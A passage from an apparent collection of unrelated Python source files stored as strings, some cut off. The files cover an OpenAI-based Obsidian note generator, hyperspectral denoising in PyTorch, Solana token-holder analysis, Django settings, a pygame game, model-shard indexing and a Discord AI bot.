model=\"gpt-4o\",\n        )\n        response = completion.choices[0].message.content\n        print(f\"[DEBUG] API call successful. Response length: {len(response)} characters\")\n        return response\n    except Exception as e:\n        print(f\"[ERROR] OpenAI API call failed: {e}\")\n        return \"\"\n\ndef create_markdown_file(file_path: Path, content: str):\n    try:\n        print(f\"[DEBUG] Creating file: {file_path}\")\n        file_path.parent.mkdir(parents=True, exist_ok=True)\n        with open(file_path, \"w\", encoding=\"utf-8\") as f:\n            f.write(content)\n        print(f\"[INFO] File created: {file_path}\")\n    except Exception as e:\n        print(f\"[ERROR] Failed to create file {file_path}: {e}\")\n\ndef create_obsidian_config(base_path: Path):\n    \"\"\"\n    Creates Obsidian Vault configuration files.\n    \"\"\"\n    try:\n        print(f\"[INFO] Creating Obsidian configuration...\")\n        obsidian_dir = base_path / OBSIDIAN_CONFIG[\"dir\"]\n        obsidian_dir.mkdir(parents=True, exist_ok=True)\n\n        settings_file = obsidian_dir / \"app.json\"\n        with open(settings_file, \"w\", encoding=\"utf-8\") as f:\n            json.dump(OBSIDIAN_CONFIG[\"settings\"], f, indent=4)\n\n        print(f\"[INFO] Obsidian configuration created in {obsidian_dir}\")\n    except Exception as e:\n        print(f\"[ERROR] Failed to create Obsidian configuration: {e}\")\n\ndef show_directory_tree(dir_path: str, prefix: str = \"\"):\n    dir_path_obj = Path(dir_path)\n    if not dir_path_obj.exists():\n        print(f\"[WARNING] Directory does not exist: {dir_path}\")\n        return\n    entries = sorted(dir_path_obj.iterdir(), key=lambda e: (not e.is_dir(), e.name))\n    for i, entry in enumerate(entries):\n        connector = \"\u2514\u2500\u2500\" if i == len(entries) - 1 else \"\u251c\u2500\u2500\"\n        print(prefix + connector + \" \" + entry.name)\n        if entry.is_dir():\n            extension = \"    \" if i == len(entries) - 1 else \"\u2502   \"\n            show_directory_tree(entry, prefix + extension)\n\n# ---------------------------------------------------------------------\n# 3. MAIN FUNCTION\n# ---------------------------------------------------------------------\n\ndef analyze_and_generate_structure():\n    # Load prompts\n    analysis_prompt = load_prompt_from_file(PROMPT_ANALYSIS_FILE)\n    if not analysis_prompt:\n        print(\"[ERROR] Analysis prompt is empty. Exiting.\")\n        return\n\n    # Load JSON data\n    data_json = json.dumps(load_json_data(JSON_FILE_PATH), ensure_ascii=False, indent=2)\n    if not data_json:\n        print(\"[ERROR] JSON data is empty or invalid. Exiting.\")\n        return\n\n    simplified_data_json = simplify_json(data_str = data_json)\n    with open('simplified_data_json.txt', \"w\", encoding=\"utf-8\") as f:\n        f.write(simplified_data_json)\n\n    analysis_prompt = analysis_prompt.fo",
    "import torch\r\nfrom torch import nn, optim \r\nfrom utils import * \r\nimport numpy as np \r\nimport scipy\r\nimport math\r\n\r\n###################\r\nw_decay = 0\r\nlr_real = 0.001\r\nmax_iter = 6001\r\nomega = 1\r\nthres = 0.5\r\nlambda_ = 7e-5 # trade-off parameter of NeurSSTV\r\n###################\r\n\r\ndata = \"data/om9\"\r\nc = \"c2\"\r\n\r\nfile_name = data+c+'.mat'\r\nmat = scipy.io.loadmat(file_name)\r\nX_np = mat[\"Nhsi\"]\r\nX = torch.from_numpy(X_np).type(dtype).cuda()\r\n[n_1,n_2,n_3] = X.shape\r\n[r1,r2,r3] = [n_1,n_2,5]\r\nmid_channel = 300\r\n\r\nfile_name = data+'gt.mat'\r\nmat = scipy.io.loadmat(file_name)\r\ngt_np = mat[\"Ohsi\"]\r\ngt = torch.from_numpy(gt_np).type(dtype).cuda()\r\nps_obs = psnr3d(gt_np, X_np)\r\n        \r\ndef main():\r\n    soft_thres = soft()\r\n    \r\n    centre = torch.Tensor(r1,r2,r3).type(dtype)\r\n    centre.requires_grad=True\r\n    U_net1 = torch.Tensor(mid_channel,1).type(dtype)\r\n    U_net1.requires_grad=True\r\n    U_net2 = torch.Tensor(mid_channel,mid_channel).type(dtype)\r\n    U_net2.requires_grad=True\r\n    U_net3 = torch.Tensor(r1,mid_channel).type(dtype)\r\n    U_net3.requires_grad=True\r\n    V_net1 = torch.Tensor(mid_channel,1).type(dtype)\r\n    V_net1.requires_grad=True\r\n    V_net2 = torch.Tensor(mid_channel,mid_channel).type(dtype)\r\n    V_net2.requires_grad=True\r\n    V_net3 = torch.Tensor(r2,mid_channel).type(dtype)\r\n    V_net3.requires_grad=True\r\n    W_net1 = torch.Tensor(mid_channel,1).type(dtype)\r\n    W_net1.requires_grad=True\r\n    W_net2 = torch.Tensor(mid_channel,mid_channel).type(dtype)\r\n    W_net2.requires_grad=True\r\n    W_net3 = torch.Tensor(r3,mid_channel).type(dtype)\r\n    W_net3.requires_grad=True\r\n    \r\n    stdv = 1 / math.sqrt(centre.size(0))\r\n    centre.data.uniform_(-stdv, stdv)\r\n    std=5\r\n    \r\n    torch.nn.init.kaiming_normal_(U_net1, a=math.sqrt(std))\r\n    torch.nn.init.kaiming_normal_(U_net2, a=math.sqrt(std))\r\n    torch.nn.init.kaiming_normal_(U_net3, a=math.sqrt(std))\r\n    torch.nn.init.kaiming_normal_(V_net1, a=math.sqrt(std))\r\n    torch.nn.init.kaiming_normal_(V_net2, a=math.sqrt(std))\r\n    torch.nn.init.kaiming_normal_(V_net3, a=math.sqrt(std))\r\n    torch.nn.init.kaiming_normal_(W_net1, a=math.sqrt(std))\r\n    torch.nn.init.kaiming_normal_(W_net2, a=math.sqrt(std))\r\n    torch.nn.init.kaiming_normal_(W_net3, a=math.sqrt(std))\r\n    \r\n    U_input = torch.from_numpy(np.array(range(1,n_1+1))).reshape(1,n_1).type(dtype)\r\n    V_input = torch.from_numpy(np.array(range(1,n_2+1))).reshape(1,n_2).type(dtype)\r\n    W_input = torch.from_numpy(np.array(range(1,n_3+1))).reshape(1,n_3).type(dtype)\r\n    \r\n    number = 400\r\n    number_3 = n_3*3\r\n    U_input_tv = (torch.from_numpy(np.array(range(1,number+1))).reshape(1,number)/(number/n_1)).type(dtype)\r\n    V_input_tv = (torch.from_numpy(np.array(range(1,number+1))).reshape(1,number)/(number/n_2)).type(dtype)\r\n    W_input_tv = (torch.from_numpy(np.array(range(1,number_3+1))).reshape(1,number_3)/(number_3/n_3)).type(dtype)\r\n    \r\n    \r\n    params = []\r\n    params += [U_net1]\r\n    params += [U_net2]\r\n    params += [U_net3]\r\n    params += [V_net1]\r\n    params += [V_net2]\r\n    params += [V_net3]\r\n    params += [W_net1]\r\n    params += [W_net2]\r\n    params += [W_net3]\r\n    params += [centre]\r\n    optimizier = optim.Adam(params, lr=lr_real, weight_decay=w_decay) \r\n    \r\n\r\n    for iter in range(max_iter):\r\n        \r\n        X_Out, out_tv, dx, dy, dz, dxz, dyz = LRTFR_HSI(U_input, V_input, W_input, \r\n                                                    U_input_tv, V_input_tv, W_input_tv, centre,\r\n                              U_net1, U_net2, U_net3, V_net1, V_net2, V_net3, \r\n                              W_net1, W_net2, W_net3, omega)\r\n        \r\n        if iter == 0:\r\n            S = (X-X_Out).type(dtype)\r\n            \r\n        S = soft_thres(X-X_Out, thres)\r\n        \r\n        loss = torch.norm(X-X_Out-S,2)\r\n        \r\n        loss = loss + 0.1*lambda_*torch.norm(dx, 1) \r\n        loss = loss + 0.1*lambda_*torch.norm(dy, 1) \r\n        loss = loss + lambda_*torch.norm(dxz, 1) \r\n        loss = loss + lambda_*torch.norm(dyz, 1) \r\n       \r\n        optimizier.zero_grad()\r\n        loss.backward()\r\n        optimizier.step()\r\n        \r\n        if iter % 100 == 0:\r\n            ps = psnr3d(gt.cpu().detach().numpy(), X_Out.cpu().detach().numpy())\r\n           \r\n            print(iter,'ps_obs',ps_obs,'psnr',ps)\r\n            \r\nmain()\r\n       \r\n    \r\n",
    "from datetime import datetime\nfrom enum import Enum\nimport requests\nfrom openai import OpenAI\nimport time\nfrom dotenv import load_dotenv\nimport os\n\n# load environment variables from .env file\nload_dotenv(dotenv_path=\"keys.env\")\n\n# credentials/configuration from environment variables\nSOLSCAN_API_KEY = os.getenv(\"SOLSCAN_API_KEY\")\nOPENAI_API_KEY = os.getenv(\"OPENAI_API_KEY\")\n\nTOP_N = os.getenv(\"TOP_N\")\n\nif not SOLSCAN_API_KEY:\n    raise ValueError(\n        \"SOLSCAN_API_KEY is not set. Please define it in keys.env.\")\nif not OPENAI_API_KEY:\n    raise ValueError(\n        \"OPENAI_API_KEY is not set. Please define it in keys.env.\")\nif TOP_N:\n    TOP_N = int(TOP_N)\nelse:\n    TOP_N = 10\n\n\nclass ValidTopN(Enum):\n    TEN = 10\n    TWENTY = 20\n    THIRTY = 30\n    FORTY = 40\n\n\ndef validate_top_n(top_n: int):\n    if top_n not in [item.value for item in ValidTopN]:\n        raise ValueError(f\"Invalid topN value: {top_n}. Allowed values are {\n                         [item.value for item in ValidTopN]}.\")\n\n\ndef validate_token_address(token_address: str):\n    if not token_address:\n        raise ValueError(\"tokenAddress is required.\")\n    if not isinstance(token_address, str):\n        raise ValueError(\"tokenAddress must be a string.\")\n    if len(token_address) != 44:\n        raise ValueError(\"tokenAddress must be 44 characters long.\")\n\n\nclass SolanaTokenAnalyzer:\n    def __init__(self, token_address: str, top_n: int = 10):\n        self.token_address = token_address\n        self.top_n = top_n\n        self.api_url = \"https://pro-api.solscan.io/v2.0\"\n        self.headers = {\"accept\": \"application/json\", \"token\": SOLSCAN_API_KEY}\n\n    def get_top_holders(self):\n        url = f\"{self.api_url}/token/holders\"\n        params = {\"address\": self.token_address, \"page_size\": self.top_n}\n\n        response = requests.get(url, params=params, headers=self.headers)\n        response.raise_for_status()\n        return response.json()[\"data\"][\"items\"]\n\n    def get_first_activity_date(self, wallet_address: str):\n        url = f\"{self.api_url}/account/balance_change\"\n        params = {\"address\": wallet_address, \"token\": self.token_address,\n                  \"sort_by\": \"block_time\", \"sort_order\": \"asc\", \"remove_spam\": \"true\"}\n        response = requests.get(url, params=params, headers=self.headers)\n        response.raise_for_status()\n        data = response.json()[\"data\"]\n        return None if len(data) == 0 else data[0][\"time\"]\n\n    def get_transactions(self, wallet_address: str):\n        transactions = []\n        url = f\"{self.api_url}/account/balance_change\"\n        params = {\n            \"address\": wallet_address,\n            \"token\": self.token_address,\n            \"sort_by\": \"block_time\",\n            \"sort_order\": \"desc\",\n            \"remove_spam\": \"true\",\n            \"page_size\": 40,\n            \"page\": 1\n        }\n\n        while True:\n            response = requests.get(url, params=params, headers=self.headers)\n            response.raise_for_status()\n\n            data = response.json()[\"data\"]\n            new_transactions = [\n                {\n                    \"trans_id\": tx.get(\"trans_id\"),\n                    \"fee\": tx.get(\"fee\"),\n                    \"amount\": tx.get(\"amount\"),\n                    \"time\": tx.get(\"time\"),\n                    \"change_type\": tx.get(\"change_type\")\n                }\n                for tx in data\n            ]\n            transactions.extend(new_transactions)\n\n            if len(data) < 40 or len(transactions) >= 100:\n                break\n\n            params[\"page\"] += 1\n            time.sleep(0.05)\n\n        return transactions\n\n    def determine_holder_type(number_of_transactions, number_of_out_transactions):\n        if number_of_transactions == 0 or number_of_out_transactions / number_of_transactions < 0.1:\n            return \"Long-term holder\"\n        return \"Frequent flipper\"\n\n    def analyze_holder(self, transactions: list):\n        number_of_transactions = len(transactions)\n        number_of_in_transactions = sum(\n            1 for tx in transactions if tx[\"change_type\"] == \"inc\")\n        number_of_out_transactions = number_of_transactions - number_of_in_transactions\n\n        type_of_holder = SolanaTokenAnalyzer.determine_holder_type(\n            number_of_transactions, number_of_out_transactions)\n\n        def format_count(count):\n            return \"more than 100\" if count >= 100 else count\n\n        return {\n            \"number_of_transactions\": format_count(number_of_transactions),\n            \"number_of_in_transactions\": format_count(number_of_in_transactions),\n            \"number_of_out_transactions\": format_count(number_of_out_transactions),\n            \"type_of_holder\": type_of_holder\n        }\n\n    def get_token_details(self, token_address: str):\n        url = f\"{self.api_url}/token/meta\"\n        params = {\"address\": token_address}\n        response = requests.get(url, params=params, headers=self.headers)\n\n        response.raise_for_status()\n        data = response.json()[\"data\"]\n\n        return",
    "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n\"\"\"\nresponse_analyzer.py\n\nAnalyzes GPT responses for linguistic or contextual cues related to truth, \ndeception, or other experiment-specific markers. Integrates NLP or \nstatistical methods as needed.\n\nUsage:\n  from response_analyzer import ResponseAnalyzer\n\n  analyzer = ResponseAnalyzer()\n  analysis_result = analyzer.analyze_response(\"Sample GPT response text...\")\n  print(analysis_result)\n\"\"\"\n\nimport re\n\nclass ResponseAnalyzer:\n    def __init__(self):\n        # Simple sets or dictionaries for demonstration\n        self.deception_keywords = {\"lie\", \"fake\", \"fabrication\", \"misleading\"}\n        self.truth_keywords = {\"fact\", \"data\", \"evidence\", \"truth\"}\n\n    def analyze_response(self, response_text):\n        \"\"\"\n        Returns a dictionary with basic analysis results (truth vs deception markers, etc.).\n\n        :param response_text: str, the GPT response to analyze.\n        :return: dict, analysis results including found markers.\n        \"\"\"\n        lower_text = response_text.lower()\n        found_deception = any(word in lower_text for word in self.deception_keywords)\n        found_truth = any(word in lower_text for word in self.truth_keywords)\n\n        return {\n            \"length\": len(response_text),\n            \"deception_markers\": found_deception,\n            \"truth_markers\": found_truth\n        }\n",
    "\"\"\"\nThese are the available settings.\n\nAll attributes prefixed ``HTMX_MESSAGES_*`` can be overridden from your Django\nproject's settings module by defining a setting with the same name.\n\"\"\"\n\nfrom __future__ import annotations\n\nfrom dataclasses import dataclass\nfrom typing import Any\n\nfrom django.conf import settings as django_settings\n\n# All attributes accessed with this prefix are possible to overwrite\n# through django.conf.settings.\nSETTINGS_PREFIX = \"HTMX_MESSAGES_\"\n\n\n@dataclass(frozen=True)\nclass AppSettings:\n    \"\"\"Access this instance as `.conf.app_settings`.\"\"\"\n\n    HTMX_MESSAGES_ENABLED: bool = True\n    \"\"\"Whether the app is enabled (dummy setting to demo usage).\"\"\"\n\n    def __getattribute__(self, __name: str) -> Any:\n        \"\"\"\n        Check if a Django project settings should override the app default.\n\n        In order to avoid returning any random properties of the django settings,\n        we inspect the prefix firstly.\n        \"\"\"\n        if __name.startswith(SETTINGS_PREFIX) and hasattr(django_settings, __name):\n            return getattr(django_settings, __name)\n\n        return super().__getattribute__(__name)\n\n\napp_settings = AppSettings()\n",
    "import matplotlib.pyplot as plt\nimport cv2\nimport glob\nimport os\nimport numpy as np\nfrom skimage.io import imread,imsave\nfrom skimage import data_dir\nfrom skimage.transform import radon, rescale\nfrom scipy.ndimage import zoom\nimport warnings\nimport time\nfrom sklearn import svm\nfrom numpy import matrix\nfrom sklearn.model_selection import KFold\nfrom sklearn.model_selection import train_test_split\nimport pickle\n\n\nwarnings.filterwarnings('ignore', '.*output shape of zoom.*')\nwarnings.filterwarnings('ignore', '.*Radon transform.*')\n\nimageformat=\".jpg\"\npath0 = \"F:/clean_data/DB1/patchradon_null700\"\npath1 = \"F:/clean_data/DB1/patchradon_one700\"\npath2 = \"F:/clean_data/DB1/patchradon_two700\"\npath3 = \"F:/clean_data/DB1/patchradon_three700\"\n\npathtest0 = \"C:/Users/leila/Desktop/radon/patchtype3_null700\"\npathtest1 = \"C:/Users/leila/Desktop/radon/patchtype3_one700\"\npathtest2 = \"C:/Users/leila/Desktop/radon/patchtype3_two700\"\npathtest3 = \"C:/Users/leila/Desktop/radon/patchtype3_three700\"\n\nimfilelist0 = [os.path.join(path0,f) for f in os.listdir(path0) if f.endswith(imageformat)]\nimfilelist1 = [os.path.join(path1,f) for f in os.listdir(path1) if f.endswith(imageformat)]\nimfilelist2 = [os.path.join(path2,f) for f in os.listdir(path2) if f.endswith(imageformat)]\nimfilelist3 = [os.path.join(path3,f) for f in os.listdir(path3) if f.endswith(imageformat)]\n\nimfilelisttest0 = [os.path.join(pathtest0,f) for f in os.listdir(pathtest0) if f.endswith(imageformat)]\nimfilelisttest1 = [os.path.join(pathtest1,f) for f in os.listdir(pathtest1) if f.endswith(imageformat)]\nimfilelisttest2 = [os.path.join(pathtest2,f) for f in os.listdir(pathtest2) if f.endswith(imageformat)]\nimfilelisttest3 = [os.path.join(pathtest3,f) for f in os.listdir(pathtest3) if f.endswith(imageformat)]\n\nname0 = os.listdir(path0)\nname1 = os.listdir(path1)\nname2 = os.listdir(path2)\nname3 = os.listdir(path3)\n\nnametest0 = os.listdir(pathtest0)\nnametest1 = os.listdir(pathtest1)\nnametest2 = os.listdir(pathtest2)\nnametest3 = os.listdir(pathtest3)\n\ndata_path0 = os.path.join(path0)\ndata_path1 = os.path.join(path1)\ndata_path2 = os.path.join(path2)\ndata_path3 = os.path.join(path3)\n\ndata_pathtest0 = os.path.join(pathtest0)\ndata_pathtest1 = os.path.join(pathtest1)\ndata_pathtest2 = os.path.join(pathtest2)\ndata_pathtest3 = os.path.join(pathtest3)\n\nfiles0 = glob.glob(data_path0)\nfiles1 = glob.glob(data_path1)\nfiles2 = glob.glob(data_path2)\nfiles3 = glob.glob(data_path3)\n\nfilestest0 = glob.glob(data_pathtest0)\nfilestest1 = glob.glob(data_pathtest1)\nfilestest2 = glob.glob(data_pathtest2)\nfilestest3 = glob.glob(data_pathtest3)\n\ndef sortrow(img):\n    a,b = img.shape\n    outrow = np.squeeze(img.reshape((1,a*b)))\n    return(outrow)\n\ndef sortcol(img):\n    a,b = img.shape\n    c = np.zeros((b,a))\n    for i in range(b):\n        c[i] = matrix(img).transpose()[i].getA()[0]\n\n    outcol = np.int32(np.squeeze(np.reshape(c,(1,a*b))))\n    return(outcol)\n\n\nacc = 0\nfor i in range(200):\n    el0 = imfilelist0[0]\n    img0 = cv2.imread(el0,0)\n    descriptor0 = sortcol(img0)\n    imfilelist0.remove(imfilelist0[0])\n    for el0 in imfilelist0:\n        img0 = cv2.imread(el0,0)\n        a0 = sortcol(img0)\n        descriptor0 = np.vstack([descriptor0,a0])\n\n    el1 = imfilelist1[0]\n    img1 = cv2.imread(el1,0)\n    descriptor1 = sortcol(img1)\n    imfilelist1.remove(imfilelist1[0])\n    for el1 in imfilelist1:\n        img1 = cv2.imread(el1,0)\n        a1 = sortcol(img1)\n        descriptor1 = np.vstack([descriptor1,a1])\n\n\n    el2 = imfilelist2[0]\n    img2 = cv2.imread(el2,0)\n    descriptor2 = sortcol(img2)\n    imfilelist2.remove(imfilelist2[0])\n    for el2 in imfilelist2:\n        img2 = cv2.imread(el2,0)\n        a2 = sortcol(img2)\n        descriptor2 = np.vstack([descriptor2,a2])    \n    \n    el3 = imfilelist3[0]\n    img3 = cv2.imread(el3,0)\n    descriptor3 = sortcol(img3)\n    imfilelist3.remove(imfilelist3[0])\n    for el3 in imfilelist3:\n        img3 = cv2.imread(el3,0)\n        a3 = sortcol(img3)\n        descriptor3 = np.vstack([descriptor3,a3])\n\n\n#test\n    el0 = imfilelisttest0[0]\n    img0 = cv2.imread(el0,0)\n    descriptortest0 = sortcol(img0)\n    imfilelisttest0.remove(imfilelisttest0[0])\n    for el0 in imfilelisttest0:\n        img0 = cv2.imread(el0,0)\n        a0 = sortcol(img0)\n        descriptortest0 = np.vstack([descriptortest0,a0])\n\n    el1 = imfilelisttest1[0]\n    img1 = cv2.imread(el1,0)\n    descriptortest1 = sortcol(img1)\n    imfilelisttest1.remove(imfilelisttest1[0])\n    for el1 in imfilelisttest1:\n        img1 = cv2.imread(el1,0)\n        a1 = sortcol(img1)\n        descriptortest1 = np.vstack([descriptortest1,a1])\n\n    el2 = imfilelisttest2[0]\n    img2 = cv2.imread(el2,0)\n    descriptortest2 = sortcol(img2)\n    imfilelisttest2.remove(imfilelisttest2[0])\n    for el2 in imfilelisttest2:\n        img2 = cv2.imread(el2,0)\n        a2 = sortcol(img2)\n        descriptortest2 = np.vstack([descriptortest2,a2])\n\n    el3 = imfilelisttest3[0]\n    img3 = cv2.imread(el3,0)\n    descriptortest3 = sortcol(img3)\n    imfileli",
    "class BaseReporter(object):\n    \"\"\"Delegate class to provider progress reporting for the resolver.\"\"\"\n\n    def starting(self):\n        \"\"\"Called before the resolution actually starts.\"\"\"\n\n    def starting_round(self, index):\n        \"\"\"Called before each round of resolution starts.\n\n        The index is zero-based.\n        \"\"\"\n\n    def ending_round(self, index, state):\n        \"\"\"Called before each round of resolution ends.\n\n        This is NOT called if the resolution ends at this round. Use `ending`\n        if you want to report finalization. The index is zero-based.\n        \"\"\"\n\n    def ending(self, state):\n        \"\"\"Called before the resolution ends successfully.\"\"\"\n\n    def adding_requirement(self, requirement, parent):\n        \"\"\"Called when adding a new requirement into the resolve criteria.\n\n        :param requirement: The additional requirement to be applied to filter\n            the available candidaites.\n        :param parent: The candidate that requires ``requirement`` as a\n            dependency, or None if ``requirement`` is one of the root\n            requirements passed in from ``Resolver.resolve()``.\n        \"\"\"\n\n    def resolving_conflicts(self, causes):\n        \"\"\"Called when starting to attempt requirement conflict resolution.\n\n        :param causes: The information on the collision that caused the backtracking.\n        \"\"\"\n\n    def rejecting_candidate(self, criterion, candidate):\n        \"\"\"Called when rejecting a candidate during backtracking.\"\"\"\n\n    def pinning(self, candidate):\n        \"\"\"Called when adding a candidate to the potential solution.\"\"\"\n",
    "import pygame\nimport tkinter as tk\n\nfrom dialog import DialogBox\nfrom player import Player\nfrom map import MapManager\nfrom menu import StartMenu\nfrom menu import MainMenu\nfrom game_window import Window\n\nclass Game(Window):\n\n    def __init__(self):\n\n        self.window = Window()\n        # G\u00e9n\u00e9rer un joueur \n        self.player = Player() \n        # G\u00e9n\u00e9rer la map\n        self.map_manager = MapManager(self.window.screen, self.player)\n        self.dialog_box = DialogBox()\n        self.start_menu = StartMenu()\n        self.menu_principal = MainMenu()\n\n    # D\u00e9finir une m\u00e9thode de d\u00e9placement pour le joueur\n    def handle_input(self):\n        pressed = pygame.key.get_pressed() # Variable qui stocke les informations concernant les touches press\u00e9es ou non\n\n        if pressed[pygame.K_z]:\n            self.player.move_up()\n        elif pressed[pygame.K_s]:\n            self.player.move_down()\n        elif pressed[pygame.K_d]:\n            self.player.move_right()\n        elif pressed[pygame.K_q]:\n            self.player.move_left()\n     \n    # D\u00e9finir un menu de d\u00e9but de jeu\n    #def draw_start_menu(self):\n    \n\n    def update(self):\n        self.map_manager.update()\n\n    def run(self):\n\n        # Le code suivant d\u00e9fini les FPS du jeu\n        clock = pygame.time.Clock()\n\n        # Boucle qui maintien le jeu ouvert\n        running = True\n\n        while running:\n            \n            # L'enti\u00e8ret\u00e9 du code qui suit permet d'incorporer les menus au code du jeu gr\u00e2ce au fichier menu.py qui r\u00e9git leur affichage tandis qu'ici est r\u00e9gi leur comportement. \n            if self.game_state == \"start_menu\":\n                for event in pygame.event.get():\n                    if event.type == pygame.QUIT:\n                        running = False\n                    elif event.type == pygame.KEYDOWN:\n                        if event.key == pygame.K_a:\n                            self.game_state = \"game\"\n                    else:\n                        self.start_menu.draw_start_menu()\n            elif self.game_state == \"choose_character\":\n                for event in pygame.event.get(): \n                    if event.type == pygame.QUIT:\n                        running == False\n                    elif event.type == pygame.KEYDOWN:\n                        if event.key == pygame.K_1: \n                            self.game_state = \"game\"\n                        #else:\n                            #self.choose_menu.draw_choose_menu()\n            elif self.game_state == \"game\":\n                self.player.save_location()\n                self.handle_input()\n                self.update()\n                self.map_manager.draw()\n                self.dialog_box.render(self.window.screen)\n                pygame.display.flip()     \n                for event in pygame.event.get():\n                    if event.type == pygame.QUIT:\n                        running = False\n                    elif event.type == pygame.KEYDOWN: \n                        if event.key == pygame.K_a: \n                            # Ici est programm\u00e9e la touche qui permet de passer au dialogue suivant\n                            self.map_manager.check_npc_collisions(self.dialog_box)\n                            self.map_manager.check_panneau_collision(self.dialog_box)\n                        elif event.key == pygame.K_t:\n                            self.game_state = \"main_menu\"\n            elif self.game_state == \"main_menu\":\n                for event in pygame.event.get():\n                    if event.type == pygame.QUIT:\n                        running = False\n                    elif event.type == pygame.KEYDOWN:\n                        if event.key == pygame.K_t:\n                            self.game_state = \"game\"\n                        elif event.key == pygame.K_s:\n                            self.game_state = \"save_menu\"\n                        elif event.key == pygame.K_q:\n                            running = False\n                    else:\n                        self.menu_principal.draw_main_menu()\n            elif self.game_state == \"save_menu\":\n                for event in pygame.event.get():\n                    if event.type == pygame.QUIT:\n                        running = False\n                    elif event.type == pygame.KEYDOWN:\n                        if event.key == pygame.K_s:\n                            self.game_state = \"main_menu\"\n                    else:\n                        self.menu_principal.draw_save_menu()\n\n            # Rappeler les FPS\n            clock.tick(60) \n\n        pygame.quit() \n\n",
    "# shard/index.py\n# Copyright (C) 2024 Martin Bukowski\n#\n# This software is free software: you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public License as\n# published by the Free Software Foundation, either version 3 of the\n# License, or (at your option) any later version.\n#\n# This software is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public License\n# along with this program. If not, see http://www.gnu.org/licenses/.\n\nfrom dataclasses import dataclass\nfrom typing import Dict, List, Optional, Set, Tuple\nimport os\nimport json\nimport logging\nimport asyncio\nimport aiohttp\nfrom pathlib import Path\nimport torch\nfrom .download import DownloadManager, DownloadStatus\n\nlogger = logging.getLogger(__name__)\n\n@dataclass\nclass ModelShard:\n    \"\"\"Represents a model weight shard and its metadata\"\"\"\n    filename: str\n    contained_keys: List[str]\n    weight_map: Dict[str, str]\n    local_path: Optional[Path] = None\n\nclass TensorPromise:\n    \"\"\"A promise for an eventual tensor\"\"\"\n    def __init__(self, model_uri: str, tensor_name: str, device: str):\n        self.model_uri = model_uri\n        self.tensor_name = tensor_name\n        self.device = device\n        self._future: asyncio.Future[torch.Tensor] = asyncio.Future()\n\n    async def get(self) -> torch.Tensor:\n        \"\"\"Await and return the tensor\"\"\"\n        return (await self._future).to(self.device)\n\n    def set_result(self, tensor: torch.Tensor):\n        \"\"\"Set the result tensor\"\"\"\n        if not self._future.done():\n            self._future.set_result(tensor)\n\n    def set_exception(self, exc: Exception):\n        \"\"\"Set an exception if loading failed\"\"\"\n        if not self._future.done():\n            self._future.set_exception(exc)\n\nclass HFMultiModelIndex:\n    \"\"\"Manages index and weight file mappings for multiple HuggingFace models\"\"\"\n    \n    def __init__(\n        self,\n        download_manager: Optional[DownloadManager] = None,\n        cache_path: Optional[Path] = None\n    ):\n        self.download_manager = download_manager\n        \n        # Default cache directory if none provided\n        if cache_path:\n            self.cache_path = cache_path\n        else:\n            self.cache_path = Path.home() / \".cache\" / \"shardmerge\"\n        self.cache_path.mkdir(parents=True, exist_ok=True)\n        \n        self.model_indexes: Dict[str, Dict] = {}\n        self.model_shards: Dict[str, Dict[str, ModelShard]] = {}\n        self._tensor_downloads: Dict[Tuple[str, str], torch.Tensor] = {}\n        self._ordered_weights: Dict[str, List[str]] = {}\n        \n    async def add_model(self, model_uri: str, revision: str = \"main\"):\n        \"\"\"Add a model to the index\"\"\"\n        if model_uri in self.model_indexes:\n            return\n\n        # Check and see if the model is already in storage:\n        model_path = self.download_manager.storage_path / model_uri\n        model_index_path = self.download_manager.storage_path / model_uri / \"model.safetensors.index.json\"\n        model_path.mkdir(parents=True, exist_ok=True)\n        \n        if model_index_path.exists():\n            logger.info(f\"Model {model_uri} already in storage, loading from {model_index_path}\")\n            with open(model_index_path, \"r\") as f:\n                index = json.load(f)\n        else:\n            # Fetch and parse index\n            index_url = f\"https://huggingface.co/{model_uri}/raw/{revision}/model.safetensors.index.json\"\n            async with aiohttp.ClientSession() as session:\n                async with session.get(index_url) as response:\n                    response.raise_for_status()\n                    logger.info(f\"Fetched index for model {model_uri}\")\n                    # Get text content and parse as JSON regardless of content type\n                    text = await response.text()\n                    with open(model_index_path, \"w\") as f:\n                        f.write(text)\n                    index = json.loads(text)\n        \n        self.model_indexes[model_uri] = index\n        \n        # Initialize shard mapping for this model\n        shard_contents: Dict[str, List[str]] = {}\n        for tensor_name, shard_file in index[\"weight_map\"].items():\n            if shard_file not in shard_contents:\n                shard_contents[shard_file] = []\n            shard_contents[shard_file].append(tensor_name)\n            \n        # Create ModelShard objects\n        self.model_shards[model_uri] = {}\n        for shard_file, tensor_keys in shard_contents.items():\n            self.model_shards[model_uri][shard_file] = ModelShard(\n                filename=shard_file,\n                contained_keys=tensor_keys,\n                weight_map={k: shard_file for k in tensor_keys},\n                local_path=None\n            )\n            \n    ",
    "import traceback\n\nimport aiohttp\nimport disnake\n\nfrom main import SurvivalBoomDiscordService as SBDS\nfrom disnake.ext import commands\n\nthis_module_name = f\"{__name__}\".removeprefix(\"modules.\")\nlogger = SBDS.mainlogger.createModuleLogger(this_module_name)\n\nis_busy = False\n\nclass TestAIModule(commands.Cog):\n\n    @commands.slash_command(name=\"ai\", description=\"SurvivalBoom AI Service?\", options=[\n        disnake.Option(name=\"prompt\", description=\"prompt\", type=3, required=True)\n    ])\n    async def aiCommand(self, ctx: disnake.ApplicationCommandInteraction, prompt: str):\n\n        global is_busy\n        if is_busy:\n            await ctx.send(\"SurvivalBoom AI Service \u0437\u0430\u0440\u0430\u0437 \u0437\u0430\u0439\u043d\u044f\u0442\u0438\u0439...\")\n            return\n\n        await ctx.send(\"\u0417\u0434\u0456\u0439\u0441\u043d\u044e\u0454\u043c\u043e \u0437\u0430\u043f\u0438\u0442 \u0434\u043e SurvivalBoom AI Service...\")\n\n        try:\n\n            is_busy = True\n            response, session = await self.httpRequest(f\"http://149.202.89.70:25514/send/{prompt}\")\n\n            if response.status != 200:\n                await ctx.edit_original_response(f\"\u0421\u0442\u0430\u043b\u0430\u0441\u044c \u043f\u043e\u043c\u0438\u043b\u043a\u0430 \u043f\u0440\u0438 \u0441\u043f\u0440\u043e\u0431\u0456 \u0437\u0432'\u044f\u0437\u0430\u0442\u0438\u0441\u044c \u0437 SurvivalBoom AI Service: {await response.text()}\")\n                is_busy = False\n                return\n\n            text = await response.text()\n\n            if 